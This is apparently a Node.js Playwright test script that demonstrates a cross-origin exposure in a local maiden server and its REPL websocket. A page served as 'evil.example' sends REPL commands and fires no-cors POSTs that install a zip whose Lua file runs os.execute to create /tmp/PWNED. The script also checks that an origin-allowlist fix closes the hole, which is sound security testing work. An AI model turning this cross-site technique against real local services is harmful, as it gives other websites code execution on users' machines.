// Evidence for docs/port/KNOWN-ISSUES.md (maiden, browser origin): a page from another site, in a real
// browser (the Chromium that Playwright installs), talks to the REPL websocket and to maiden on 127.0.0.1.
// usage: [ALLOWED=1] node maiden_exposure.js MAIDEN_DIR WS_WRAPPER     (needs `cat`; nothing else, no norns)
// ALLOWED=1: ws-wrapper runs with the origin list the launcher gives it (the fix); without: as before the fix.
// also opens maiden's own page and reports whether its REPL websockets work (they must, with the fix).
const { chromium } = require('playwright');
const { spawn } = require('child_process');
const net = require('net'), fs = require('fs'), os = require('os'), path = require('path');
const [maidenDir, wsw] = process.argv.slice(2);
const free = () => new Promise(r => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
const sleep = ms => new Promise(r => setTimeout(r, ms));
(async () => {
  const [pm, pw] = [await free(), await free()];
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'mx-'));
  for (const d of ['dust/code', 'dust/data/sources', 'dust/data/catalogs', 'doc']) fs.mkdirSync(path.join(home, d), { recursive: true });
  fs.writeFileSync(path.join(home, 'victim.zip'), require('child_process').execSync(
    `cd ${home} && mkdir -p z/victim-main && echo 'os.execute("touch /tmp/PWNED")' > z/victim-main/victim.lua && cd z && python3 -c "import zipfile,os;z=zipfile.ZipFile('../v.zip','w');z.write('victim-main/victim.lua')" && cat ../v.zip`));
  const kids = [
    spawn(wsw, [`ws://127.0.0.1:${pw}`, 'cat'], { env: { ...process.env, WS_WRAPPER_ALLOWED_ORIGINS: process.env.ALLOWED === '1' ? `http://127.0.0.1:${pm},http://localhost:${pm}` : '' }, stdio: 'ignore' }),
    spawn('./maiden', ['server', '--host', '127.0.0.1', '--port', pm, '--app', './app/build', '--data', home + '/dust', '--doc', home + '/doc'],
      { cwd: maidenDir, env: { ...process.env, HOME: home }, stdio: 'ignore' }),
  ];
  await sleep(2500);
  const browser = await chromium.launch();
  const page = await browser.newPage();
  // "evil.example" is served by the test itself; it is a different site than 127.0.0.1
  await page.route('http://evil.example/**', r => r.fulfill({ contentType: 'text/html', body: '<html><body>a page from another site</body></html>' }));
  await page.goto('http://evil.example/');
  const r = await page.evaluate(async ([pw, pm]) => {
    const out = {};
    out.ws = await new Promise(res => {
      const s = new WebSocket(`ws://127.0.0.1:${pw}`, ['bus.sp.nanomsg.org']);
      let opened = false;
      s.onopen = () => { opened = true; s.send('print("run by a web page")\n'); };
      s.onmessage = e => res('open, REPL answered: ' + JSON.stringify(e.data));
      s.onclose = () => res(opened ? 'open, then closed by the server' : 'refused');
      s.onerror = () => {};
      setTimeout(() => res(opened ? 'open, no answer' : 'no connection'), 3000);
    });
    try {
      const x = await fetch(`http://127.0.0.1:${pm}/api/v1/project/install?url=file:///nonexistent.zip`, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' } });
      out.post = 'sent (opaque response, request was made)';
    } catch (e) { out.post = 'blocked: ' + e; }
    return out;
  }, [pw, pm]).catch(e => ({ error: String(e) }));
  // the POST above needs the real zip path: do it again with it, and look on disk
  r.post2 = await page.evaluate(([pm, url]) => fetch(`http://127.0.0.1:${pm}/api/v1/project/install?url=${url}`, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' } }).then(() => 'request made', e => 'blocked by the browser: ' + e), [pm, 'file://' + home + '/v.zip']);
  await sleep(500);
  r.installed_on_disk = fs.existsSync(path.join(home, 'dust/code/v/victim.lua')) || fs.readdirSync(path.join(home, 'dust/code')).join(',') || 'nothing';
  const own = await browser.newPage();
  const sockets = [];
  own.on('websocket', w => { const rec = { url: w.url(), closed: false }; sockets.push(rec); w.on('close', () => { rec.closed = true; }); });
  const errors = [];
  own.on('pageerror', e => errors.push(String(e)));
  await own.goto(`http://127.0.0.1:${pm}/maiden/`);
  await sleep(2500);
  r.own_page = { title: await own.title(), repl_websockets: sockets.map(x => x.url.replace(/:\d+$/, ':<port>') + (x.closed ? ' (closed)' : ' (open)')), page_errors: errors };
  console.log(JSON.stringify(r, null, 1));
  await browser.close();
  kids.forEach(k => k.kill());
})();
